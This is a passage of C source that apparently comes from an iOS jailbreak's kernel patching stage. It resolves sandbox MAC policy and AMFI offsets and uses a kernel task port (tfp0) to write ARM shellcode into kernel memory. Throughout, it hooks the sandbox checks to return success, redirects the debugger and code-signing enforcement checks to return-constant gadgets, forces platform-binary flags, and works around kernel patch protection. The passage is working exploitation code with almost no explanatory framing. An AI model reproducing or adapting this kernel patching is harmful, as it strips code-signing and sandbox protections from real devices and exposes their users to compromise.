        if(!(mpc_ops.mpo_mount_check_fsctl = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_fsctl)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_rename = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_access = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_chroot = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_create = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_deleteextattr = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_exchangedata = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_getattrlist = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_getextattr = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_ioctl = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_link = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_listextattr = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_open = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_readlink = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_revoke = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_revoke)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_setattrlist = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_setextattr = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_setflags = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_setmode = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_setowner = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_setutimes = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_stat = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_truncate = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_unlink = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)))) goto fail;
        if(!(mpc_ops.mpo_file_check_mmap = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)))) goto fail;
 
#ifdef __LP64__
        // ret_gadget & x30
        if(!(mpc_list.proc_check_fork_ret = KOFFSET(region, find_proc_check_fork_ret(region, kdata, ksize, mpc_ops.mpo_proc_check_fork)))) goto fail;
        if(!(mpc_list.proc_check_fork_lr = KOFFSET(region, find_proc_check_fork_lr(region, kdata, ksize, mpc_ops.mpo_proc_check_fork)))) goto fail;
        
        if(!(mpc_list.iokit_check_open_ret = KOFFSET(region, find_iokit_check_open_ret(region, kdata, ksize, mpc_ops.mpo_iokit_check_open)))) goto fail;
        if(!(mpc_list.iokit_check_open_lr = KOFFSET(region, find_iokit_check_open_lr(region, kdata, ksize, mpc_ops.mpo_iokit_check_open)))) goto fail;
        
        if(!(mpc_list.mount_check_fsctl_ret = KOFFSET(region, find_mount_check_fsctl_ret(region, kdata, ksize, mpc_ops.mpo_mount_check_fsctl)))) goto fail;
        if(!(mpc_list.mount_check_fsctl_lr = KOFFSET(region, find_mount_check_fsctl_lr(region, kdata, ksize, mpc_ops.mpo_mount_check_fsctl)))) goto fail;
        
        if(!(mpc_list.vnode_check_rename_ret = KOFFSET(region, find_vnode_check_rename_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_rename)))) goto fail;
        if(!(mpc_list.vnode_check_rename_lr_1 = KOFFSET(region, find_vnode_check_rename_lr_1(region, kdata, ksize, mpc_ops.mpo_vnode_check_rename)))) goto fail;
        if(!(mpc_list.vnode_check_rename_lr_2 = KOFFSET(region, find_vnode_check_rename_lr_2(region, kdata, ksize, mpc_ops.mpo_vnode_check_rename)))) goto fail;
        if(!(mpc_list.vnode_check_rename_lr_3 = KOFFSET(region, find_vnode_check_rename_lr_3(region, kdata, ksize, mpc_ops.mpo_vnode_check_rename)))) goto fail;
        if(!(mpc_list.vnode_check_rename_lr_4 = KOFFSET(region, find_vnode_check_rename_lr_4(region, kdata, ksize, mpc_ops.mpo_vnode_check_rename)))) goto fail;
        
        if(!(mpc_list.vnode_check_access_ret = KOFFSET(region, find_vnode_check_access_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_access)))) goto fail;
        if(!(mpc_list.vnode_check_access_lr = KOFFSET(region, find_vnode_check_access_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_access)))) goto fail;
        
        if(!(mpc_list.vnode_check_chroot_ret = KOFFSET(region, find_vnode_check_chroot_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_chroot)))) goto fail;
        if(!(mpc_list.vnode_check_chroot_lr = KOFFSET(region, find_vnode_check_chroot_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_chroot)))) goto fail;
        
        if(!(mpc_list.vnode_check_create_ret = KOFFSET(region, find_vnode_check_create_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_create)))) goto fail;
        if(!(mpc_list.vnode_check_create_lr_1 = KOFFSET(region, find_vnode_check_create_lr_1(region, kdata, ksize, mpc_ops.mpo_vnode_check_create)))) goto fail;
        if(!(mpc_list.vnode_check_create_lr_2 = KOFFSET(region, find_vnode_check_create_lr_2(region, kdata, ksize, mpc_ops.mpo_vnode_check_create)))) goto fail;
        if(!(mpc_list.vnode_check_create_lr_3 = KOFFSET(region, find_vnode_check_create_lr_3(region, kdata, ksize, mpc_ops.mpo_vnode_check_create)))) goto fail;
        
        if(!(mpc_list.vnode_check_deleteextattr_ret = KOFFSET(region, find_vnode_check_deleteextattr_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_deleteextattr)))) goto fail;
        if(!(mpc_list.vnode_check_deleteextattr_lr = KOFFSET(region, find_vnode_check_deleteextattr_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_deleteextattr)))) goto fail;
        
        if(!(mpc_list.vnode_check_exchangedata_ret = KOFFSET(region, find_vnode_check_exchangedata_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_exchangedata)))) goto fail;
        if(!(mpc_list.vnode_check_exchangedata_lr_1 = KOFFSET(region, find_vnode_check_exchangedata_lr_1(region, kdata, ksize, mpc_ops.mpo_vnode_check_exchangedata)))) goto fail;
        if(!(mpc_list.vnode_check_exchangedata_lr_2 = KOFFSET(region, find_vnode_check_exchangedata_lr_2(region, kdata, ksize, mpc_ops.mpo_vnode_check_exchangedata)))) goto fail;
        
        if(!(mpc_list.vnode_check_getattrlist_ret = KOFFSET(region, find_vnode_check_getattrlist_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_getattrlist)))) goto fail;
        if(!(mpc_list.vnode_check_getattrlist_lr = KOFFSET(region, find_vnode_check_getattrlist_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_getattrlist)))) goto fail;
        
        if(!(mpc_list.vnode_check_getextattr_ret = KOFFSET(region, find_vnode_check_getextattr_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_getextattr)))) goto fail;
        if(!(mpc_list.vnode_check_getextattr_lr = KOFFSET(region, find_vnode_check_getextattr_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_getextattr)))) goto fail;
        
        if(!(mpc_list.vnode_check_ioctl_ret = KOFFSET(region, find_vnode_check_ioctl_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_ioctl)))) goto fail;
        if(!(mpc_list.vnode_check_ioctl_lr = KOFFSET(region, find_vnode_check_ioctl_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_ioctl)))) goto fail;
        
        if(!(mpc_list.vnode_check_link_ret = KOFFSET(region, find_vnode_check_link_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_link)))) goto fail;
        if(!(mpc_list.vnode_check_link_lr_1 = KOFFSET(region, find_vnode_check_link_lr_1(region, kdata, ksize, mpc_ops.mpo_vnode_check_link)))) goto fail;
        if(!(mpc_list.vnode_check_link_lr_2 = KOFFSET(region, find_vnode_check_link_lr_2(region, kdata, ksize, mpc_ops.mpo_vnode_check_link)))) goto fail;
        if(!(mpc_list.vnode_check_link_lr_3 = KOFFSET(region, find_vnode_check_link_lr_3(region, kdata, ksize, mpc_ops.mpo_vnode_check_link)))) goto fail;
        
        if(!(mpc_list.vnode_check_listextattr_ret = KOFFSET(region, find_vnode_check_listextattr_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_listextattr)))) goto fail;
        if(!(mpc_list.vnode_check_listextattr_lr = KOFFSET(region, find_vnode_check_listextattr_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_listextattr)))) goto fail;
        
        if(!(mpc_list.vnode_check_open_ret = KOFFSET(region, find_vnode_check_open_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_open)))) goto fail;
        if(!(mpc_list.vnode_check_open_lr = KOFFSET(region, find_vnode_check_open_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_open)))) goto fail;
        
        if(!(mpc_list.vnode_check_readlink_ret = KOFFSET(region, find_vnode_check_readlink_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_readlink)))) goto fail;
        if(!(mpc_list.vnode_check_readlink_lr = KOFFSET(region, find_vnode_check_readlink_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_readlink)))) goto fail;
        
        if(!(mpc_list.vnode_check_revoke_ret = KOFFSET(region, find_vnode_check_revoke_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_revoke)))) goto fail;
        if(!(mpc_list.vnode_check_revoke_lr = KOFFSET(region, find_vnode_check_revoke_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_revoke)))) goto fail;
        
        if(!(mpc_list.vnode_check_setattrlist_ret = KOFFSET(region, find_vnode_check_setattrlist_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setattrlist)))) goto fail;
        if(!(mpc_list.vnode_check_setattrlist_lr = KOFFSET(region, find_vnode_check_setattrlist_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setattrlist)))) goto fail;
        
        if(!(mpc_list.vnode_check_setextattr_ret = KOFFSET(region, find_vnode_check_setextattr_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setextattr)))) goto fail;
        if(!(mpc_list.vnode_check_setextattr_lr = KOFFSET(region, find_vnode_check_setextattr_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setextattr)))) goto fail;
        
        if(!(mpc_list.vnode_check_setflags_ret = KOFFSET(region, find_vnode_check_setflags_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setflags)))) goto fail;
        if(!(mpc_list.vnode_check_setflags_lr = KOFFSET(region, find_vnode_check_setflags_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setflags)))) goto fail;
        
        if(!(mpc_list.vnode_check_setmode_ret = KOFFSET(region, find_vnode_check_setmode_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setmode)))) goto fail;
        if(!(mpc_list.vnode_check_setmode_lr = KOFFSET(region, find_vnode_check_setmode_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setmode)))) goto fail;
        
        if(!(mpc_list.vnode_check_setowner_ret = KOFFSET(region, find_vnode_check_setowner_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setowner)))) goto fail;
        if(!(mpc_list.vnode_check_setowner_lr = KOFFSET(region, find_vnode_check_setowner_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setowner)))) goto fail;
        
        if(!(mpc_list.vnode_check_setutimes_ret = KOFFSET(region, find_vnode_check_setutimes_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_setutimes)))) goto fail;
        if(!(mpc_list.vnode_check_setutimes_lr = KOFFSET(region, find_vnode_check_setutimes_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_setutimes)))) goto fail;
        
        if(!(mpc_list.vnode_check_stat_ret = KOFFSET(region, find_vnode_check_stat_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_stat)))) goto fail;
        if(!(mpc_list.vnode_check_stat_lr = KOFFSET(region, find_vnode_check_stat_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_stat)))) goto fail;
        
        if(!(mpc_list.vnode_check_truncate_ret = KOFFSET(region, find_vnode_check_truncate_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_truncate)))) goto fail;
        if(!(mpc_list.vnode_check_truncate_lr = KOFFSET(region, find_vnode_check_truncate_lr(region, kdata, ksize, mpc_ops.mpo_vnode_check_truncate)))) goto fail;
        
        if(!(mpc_list.vnode_check_unlink_ret = KOFFSET(region, find_vnode_check_unlink_ret(region, kdata, ksize, mpc_ops.mpo_vnode_check_unlink)))) goto fail;
        if(!(mpc_list.vnode_check_unlink_lr_1 = KOFFSET(region, find_vnode_check_unlink_lr_1(region, kdata, ksize, mpc_ops.mpo_vnode_check_unlink)))) goto fail;
        if(!(mpc_list.vnode_check_unlink_lr_2 = KOFFSET(region, find_vnode_check_unlink_lr_2(region, kdata, ksize, mpc_ops.mpo_vnode_check_unlink)))) goto fail;

        if(!(mpc_list.file_check_mmap_ret = KOFFSET(region, find_file_check_mmap_ret(region, kdata, ksize, mpc_ops.mpo_file_check_mmap)))) goto fail;
        if(!(mpc_list.file_check_mmap_lr = KOFFSET(region, find_file_check_mmap_lr(region, kdata, ksize, mpc_ops.mpo_file_check_mmap)))) goto fail;
#endif
        printLog("[Found] %s", "Sandbox MAC policies");
    }
    
    {
        DEBUGLog("Sandbox __got");
        if(!(sb_PE_i_can_has_debugger_got = KOFFSET(region, find_sb_PE_i_can_has_debugger_got(region, kdata, ksize, mpc_ops.mpo_vnode_check_exec)))) goto fail;
#ifdef __LP64__
        if(!(sb_memset_got = KOFFSET(region, find_sb_memset_got(region, kdata, ksize, mpc_ops.mpo_proc_check_fork)))) goto fail;
#endif
        // remount stuff
        if(!(sb_vfs_rootvnode_got = KOFFSET(region, find_sb_vfs_rootvnode_got(region, kdata, ksize, mpc_ops.mpo_mount_check_remount)))) goto fail;
        printLog("[Found] %s", "Sandbox __got");
    }
    
    {
        DEBUGLog("vnode");
        vfs_rootvnode_fn = rkptr(sb_vfs_rootvnode_got);
        if(!vfs_rootvnode_fn) {
            DEBUGLog("[ERROR] Failed to read offset!");
            goto fail;
        }
#ifndef __LP64__
        vfs_rootvnode_fn -= 1; // thumb
#endif
        
        if(!(rootvnode = KOFFSET(region, find_rootvnode_offset(region, kdata, ksize, vfs_rootvnode_fn)))) goto fail;
        rootfs_vnode = rkptr(rootvnode);
        if(!rootvnode) {
            DEBUGLog("[ERROR] Failed to read offset!");
            goto fail;
        }
        printLog("[Found] %s", "vnode");
    }
    
#ifndef __LP64__
    {
        // armv7
        DEBUGLog("legacy");
        if(!(vm_fault_enter = KOFFSET(region, find_vm_fault_enter_patch(region, kdata, ksize)))) goto fail;
        if(!(vm_map_enter = KOFFSET(region, find_vm_map_enter_patch(region, kdata, ksize)))) goto fail;
        if(!(vm_map_protect = KOFFSET(region, find_vm_map_protect_patch(region, kdata, ksize)))) goto fail;
        if(!(csops = KOFFSET(region, find_csops(region, kdata, ksize)))) goto fail;
        if(!(pmap_location = KOFFSET(region, find_pmap_location(region, kdata, ksize)))) goto fail;
        
        // task_for_pid
        if(!(tfp0_patch = KOFFSET(region, find_tfp0_patch(region, kdata, ksize)))) goto fail;
        
        kaddr_t pmap_store = rkptr(pmap_location);
        if(!pmap_store) {
            DEBUGLog("[ERROR] Failed to read offset!");
            goto fail;
        }
        tte_virt = rkptr(pmap_store);
        tte_phys = rkptr(pmap_store+4);
        
        printLog("[Found] %s", "legacy");
        
    }
    
    // search __TEXT free area
    kaddr_t last_section = 0;
    kaddr_t text_last = text_vmaddr + (kaddr_t)text_vmsize;
    if(data_vmaddr == text_last) {
        for (unsigned int i = 0; i < 4; i++) {
            uint32_t j=0;
            if(i==0) {
                j = text_text_sec_addr + (kaddr_t)text_text_sec_size;
            }
            if(i==1) {
                j = text_const_sec_addr + (kaddr_t)text_const_sec_size;
            }
            if(i==2) {
                j = text_cstring_sec_addr + (kaddr_t)text_cstring_sec_size;
            }
            if(i==3) {
                j = text_os_log_sec_addr + (kaddr_t)text_os_log_sec_size;
            }
            if(j > last_section) last_section = j;
        }
        
        if(text_last <= (last_section+0x100)) {
            printf("wtf?!\n");
            goto fail;
        } else {
            last_section += 0x100;
            last_section = (last_section & ~0xFF);
        }
        printLog("__TEXT last: %08x", (uint32_t)last_section);
        
    } else {
        printf("wtf!?\n");
        goto fail;
    }
#endif
    
    printLog("patching kernel");
    
#ifdef __LP64__
    /*--- shellcode ---*/
    kaddr_t amfi_shellcode = 0;
    kaddr_t ptr = 0;
    mach_vm_allocate(tfp0, (mach_vm_address_t*)&amfi_shellcode, isvad ? 0x1000 : 0x4000, VM_FLAGS_ANYWHERE); // r-x region
    mach_vm_allocate(tfp0, (mach_vm_address_t*)&ptr, isvad ? 0x1000 : 0x4000, VM_FLAGS_ANYWHERE); // rw- region
    DEBUGLog("[*] amfi_shellcode: %llx", amfi_shellcode);
    DEBUGLog("[*] ptr: %llx", ptr);
    
    {
        printLog("[AMFI] amfi shellcode");
        // amfi
        amfiBase = amfi_shellcode + 0x200;
        
        // modify the cs flags
        wk32(amfi_shellcode + 0x200, 0x580003c8); // ldr        x8, _amfi_execve_hook
        wk32(amfi_shellcode + 0x204, 0xeb0803df); // cmp        x30, x8
        wk32(amfi_shellcode + 0x208, 0x54000060); // b.eq       _amfi_shellcode+0x214
        wk32(amfi_shellcode + 0x20c, 0x580003a8); // ldr        x8, _vnode_isreg
        wk32(amfi_shellcode + 0x210, 0xd61f0100); // br         x8
        
        wk32(amfi_shellcode + 0x214, 0xf9400fb0); // ldr        x16, [x29, #0x18]
        wk32(amfi_shellcode + 0x218, 0xb9400208); // ldr        w8, [x16]
        wk32(amfi_shellcode + 0x21c, 0x32060108); // orr        w8, w8, #0x4000000
        wk32(amfi_shellcode + 0x220, 0x321e0108); // orr        w8, w8, #0x4
        wk32(amfi_shellcode + 0x224, 0x321d0108); // orr        w8, w8, #0x8
        wk32(amfi_shellcode + 0x228, 0x12146d08); // and        w8, w8, #0xfffffffffffff0ff
        wk32(amfi_shellcode + 0x22c, 0xb9000208); // str        w8, [x16]
        wk32(amfi_shellcode + 0x230, 0xf94007a8); // ldr        x8, [x29, #0x8]
        wk32(amfi_shellcode + 0x234, 0x580002b0); // ldr        x16, ptr
        wk32(amfi_shellcode + 0x238, 0xf9000208); // str        x8, [x16]
        wk32(amfi_shellcode + 0x23c, 0x10000088); // adr        x8, #0x24c
        wk32(amfi_shellcode + 0x240, 0xf90007a8); // str        x8, [x29, #0x8]
        wk32(amfi_shellcode + 0x244, 0x580001e8); // ldr        x8, _vnode_isreg
        wk32(amfi_shellcode + 0x248, 0xd61f0100); // br         x8
        
        wk32(amfi_shellcode + 0x24c, 0xf94007f0); // ldr        x16, [sp, #0x8]
        wk32(amfi_shellcode + 0x250, 0xb9400208); // ldr        w8, [x16]
        wk32(amfi_shellcode + 0x254, 0x32060108); // orr        w8, w8, #0x4000000
        wk32(amfi_shellcode + 0x258, 0x321e0108); // orr        w8, w8, #0x4
        wk32(amfi_shellcode + 0x25c, 0x321d0108); // orr        w8, w8, #0x8
        wk32(amfi_shellcode + 0x260, 0x12146d08); // and        w8, w8, #0xfffffffffffff0ff
        wk32(amfi_shellcode + 0x264, 0xb9000208); // str        w8, [x16]
        wk32(amfi_shellcode + 0x268, 0x58000110); // ldr        x16, ptr
        wk32(amfi_shellcode + 0x26c, 0xf9400210); // ldr        x16, [x16]
        wk32(amfi_shellcode + 0x270, 0xd2800000); // movz       x0, #0x0
        wk32(amfi_shellcode + 0x274, 0xd61f0200); // br         x16
        
        wkptr(amfi_shellcode + 0x278, _amfi_execve_hook);
        wkptr(amfi_shellcode + 0x280, _vnode_isreg);
        wkptr(amfi_shellcode + 0x288, ptr);
    }
    
    {
        printLog("[Sandbox] shellcode");
        // sandbox
        kaddr_t sbshc = 0;
        kaddr_t next = 0;
        
        sbshc = amfi_shellcode + 0x2a0;
        
        
        sb_memset_hook(sbshc, mpc_list.proc_check_fork_lr, mpc_list.proc_check_fork_ret, memset_stub); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.iokit_check_open_lr, mpc_list.iokit_check_open_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.mount_check_fsctl_lr, mpc_list.mount_check_fsctl_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_rename_lr_1, mpc_list.vnode_check_rename_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_rename_lr_2, mpc_list.vnode_check_rename_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_rename_lr_3, mpc_list.vnode_check_rename_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_rename_lr_4, mpc_list.vnode_check_rename_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_access_lr, mpc_list.vnode_check_access_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_chroot_lr, mpc_list.vnode_check_chroot_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_create_lr_1, mpc_list.vnode_check_create_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_create_lr_2, mpc_list.vnode_check_create_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_create_lr_3, mpc_list.vnode_check_create_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_deleteextattr_lr, mpc_list.vnode_check_deleteextattr_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_exchangedata_lr_1, mpc_list.vnode_check_exchangedata_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_exchangedata_lr_2, mpc_list.vnode_check_exchangedata_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_getattrlist_lr, mpc_list.vnode_check_getattrlist_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_getextattr_lr, mpc_list.vnode_check_getextattr_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_ioctl_lr, mpc_list.vnode_check_ioctl_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_link_lr_1, mpc_list.vnode_check_link_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_link_lr_2, mpc_list.vnode_check_link_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_link_lr_3, mpc_list.vnode_check_link_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_listextattr_lr, mpc_list.vnode_check_listextattr_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_open_lr, mpc_list.vnode_check_open_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_readlink_lr, mpc_list.vnode_check_readlink_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_revoke_lr, mpc_list.vnode_check_revoke_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_setattrlist_lr, mpc_list.vnode_check_setattrlist_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_setextattr_lr, mpc_list.vnode_check_setextattr_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_setflags_lr, mpc_list.vnode_check_setflags_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_setmode_lr, mpc_list.vnode_check_setmode_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_setowner_lr, mpc_list.vnode_check_setowner_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_setutimes_lr, mpc_list.vnode_check_setutimes_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_stat_lr, mpc_list.vnode_check_stat_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_truncate_lr, mpc_list.vnode_check_truncate_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_unlink_lr_1, mpc_list.vnode_check_unlink_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.vnode_check_unlink_lr_2, mpc_list.vnode_check_unlink_ret, next); next = sbshc; sbshc += 0x40;
        sb_memset_hook(sbshc, mpc_list.file_check_mmap_lr, mpc_list.file_check_mmap_ret, next);
        
        mach_vm_protect(tfp0, amfi_shellcode, isvad ? 0x1000 : 0x4000, 0x0, VM_PROT_READ|VM_PROT_EXECUTE);
        mach_vm_protect(tfp0, ptr, isvad ? 0x1000 : 0x4000, 0x0, VM_PROT_READ|VM_PROT_WRITE);
        
        sbBase = sbshc;
    }
#else
    {   // armv7
        // There is no KPP on these devices.
        // amfi_execve_hook: makes sure amfi doesn't try to kill our binaries
        // make writable that free space on __TEXT (r-x region)
        patch_page_table(tte_virt, tte_phys, (last_section & ~0xFFF));
        
        int i = 0;
        wk32(last_section+i, 0x0000F8DA); i+=4; // ldr.w   r0, [sl]            @ cs_flags
        wk32(last_section+i, 0x6080F040); i+=4; // orr     r0, r0, #0x4000000  @ CS_PLATFORM_BINARY
        wk32(last_section+i, 0x000FF040); i+=4; // orr     r0, r0, #0x000f     @ CS_VALID | CS_ADHOC | CS_GET_TASK_ALLOW | CS_INSTALLER
        wk32(last_section+i, 0x507CF420); i+=4; // bic     r0, r0, #0x3f00     @ clearing CS_HARD | CS_KILL | CS_CHECK_EXPIRATION | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV
        wk32(last_section+i, 0x0000F8CA); i+=4; // str.w   r0, [sl]
        wk16(last_section+i, 0x2000); i+=2;     // movs    r0, #0x0
        wk16(last_section+i, 0xB006); i+=2;     // add     sp, #0x18
        wk32(last_section+i, 0x0D00E8BD); i+=4; // pop.w   {r8, sl, fp}
        wk16(last_section+i, 0xBDF0); i+=2;     // pop     {r4, r5, r6, r7, pc}
    }
#endif
    
    printLog("[*] shellcode: DONE");
    sleep(1);
    
    
    /*
     * __got hook
     *  caution!
     *   on aarch64 & 9.3.4+, _got would be checked by KPP.
     *   if these devices are detected, use fakepage_lookup() to change the variable to the remapped area, and patch it.
     */
    
    printLog("[*] Hooking __DATA.__got");
    {
        // LwVM
#ifdef __LP64__
        if (kpp)
            lwvm_krnl_conf_got = fakepage_lookup(lwvm_krnl_conf_got, physp, false);
#endif
        printLog("[LwVM] _PE_i_can_has_kernel_configuration: isWriteProtected check bypass");
        wkptr(lwvm_krnl_conf_got, lwvm_jump);
        
        
        // AMFI
#ifdef __LP64__
        if (kpp) {
            amfi_PE_i_can_has_debugger_got = fakepage_lookup(amfi_PE_i_can_has_debugger_got, physp, false);
            amfi_cs_enforcement_got = fakepage_lookup(amfi_cs_enforcement_got, physp, false);
        }
#endif
        printLog("[AMFI] _PE_i_can_has_debugger: ret1 gadget");
        wkptr(amfi_PE_i_can_has_debugger_got, ret1_gadget);
        printLog("[AMFI] _cs_enforcement: ret0 gadget");
        wkptr(amfi_cs_enforcement_got, ret0_gadget);
        
#ifdef __LP64__
        if (kpp)
            amfi_vnode_isreg_got = fakepage_lookup(amfi_vnode_isreg_got, physp, false);
        
        printLog("[AMFI] _vnode_isreg: shellcode");
        wkptr(amfi_vnode_isreg_got, amfiBase);
#else
        printLog("[AMFI] execve_hook (__TEXT patch)");
        // There is no KPP on these devices.
        patch_page_table(tte_virt, tte_phys, (amfi_execve_ret & ~0xFFF));
        uint32_t unbase_addr = amfi_execve_ret - region;
